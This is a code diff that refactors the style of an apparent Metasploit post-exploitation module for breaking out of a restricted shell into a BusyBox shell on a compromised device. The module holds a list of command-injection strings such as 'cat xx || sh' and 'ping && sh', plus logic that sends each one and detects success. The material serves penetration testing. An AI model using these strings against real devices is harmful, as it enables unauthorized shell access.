@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   METHODS = [
     'cat xx || sh',
     'ping || sh',
@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Post
     'cat xx && sh',
     'echo xx && sh',
     'ping && sh'
-  ]
+  ].freeze
 
   def initialize
     super(
@@ -51,19 +51,18 @@ class MetasploitModule < Msf::Post
   end
 
   def try_method(command)
-      vprint_status("jailbreak sent: #{command}")
-      session.shell_write("#{command}\n")
-      (1..10).each do
-        resp = session.shell_read
-        next unless resp.to_s.length > 0
-        vprint_status("jailbreak received: #{resp}")
-        if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i
-          print_good("Jailbreak accomplished with #{command}")
-          return true
-        end
+    vprint_status("jailbreak sent: #{command}")
+    session.shell_write("#{command}\n")
+    10.times do
+      resp = session.shell_read
+      next if resp.to_s.empty?
+      vprint_status("jailbreak received: #{resp}")
+      if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i
+        print_good("Jailbreak accomplished with #{command}")
+        return true
       end
+    end
 
-      false
+    false
   end
-
 end
